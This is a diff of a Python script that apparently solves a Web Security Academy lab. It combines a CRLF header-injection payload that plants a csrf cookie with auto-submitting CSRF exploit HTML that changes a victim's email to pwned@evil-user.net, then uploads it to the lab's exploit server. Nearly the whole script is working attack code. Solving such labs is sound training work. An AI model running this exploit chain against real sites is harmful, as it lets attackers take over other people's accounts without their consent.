@@ -1,14 +1,14 @@
 import requests
 from bs4 import BeautifulSoup
 
-site = 'ac861ff51e64ccc6c0b07e8600fa007c.web-security-academy.net'
+site = 'ac6e1ff41e3685dac087e92f00ea0047.web-security-academy.net'
 
 s = requests.Session()
 
-# def getHeadersFromSearch(search_term):
-#     resp = requests.get(f"https://{site}/?search={search_term}")
-#     for header in resp.headers.items():
-#         print(header)
+def getHeadersFromSearch(search_term):
+    resp = requests.get(f"https://{site}/?search={search_term}")
+    for header in resp.headers.items():
+        print(header)
 
 # # getHeadersFromSearch("elafleur")
 # # getHeadersFromSearch("elafleur\nfoo: bar")
@@ -48,7 +48,7 @@ s = requests.Session()
 
 import urllib
 login_url = f'https://{site}/login'
-change_email_url = f'https://{site}/my-account/change-email'
+change_email_url = f'https://{site}/my-account'
 search_term = urllib.parse.quote("elafleur\nSet-Cookie: csrf=foo")
 search_url = f'https://{site}/?search={search_term}'
 print(f'URL to embed ({search_url})')
@@ -61,12 +61,34 @@ print(f'URL to embed ({search_url})')
 #     </form>
 #     <img src="{search_url}" onerror="document.forms[0].submit();">
 # '''
+url = f'https://{site}/'
+resp = s.get(url)
+soup = BeautifulSoup(resp.text,'html.parser')
+exploit_url = soup.find('a', {'id':'exploit-link'}).get('href')
+
+change_email_url = f'https://{site}/my-account'
+login_url = f'https://{site}/login'
+search_term = urllib.parse.quote("mberz2\nSet-Cookie: csrf=foo")
+search_url = f'https://{site}/?search={search_term}'
+print(f'URL to embed ({search_url})')
 
 exploit_html = f'''
-    <form action="{change_email_url}" method="POST">
+    <form action="https://{site}/my-account/change-email" method="POST">
     <input type="hidden" name="email" value="pwned@evil-user.net">
     <input type="hidden" name="csrf" value="foo">
     </form>
     <img src="{search_url}"
     onerror="document.forms[0].submit();">
 '''
+
+formData = {
+    'urlIsHttps': 'on',
+    'responseFile': '/exploit',
+    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
+    'responseBody': exploit_html,
+    'formAction': 'STORE'
+}
+
+resp = s.post(exploit_url, data=formData)
+soup = BeautifulSoup(resp.text,'html.parser')
+print(soup)
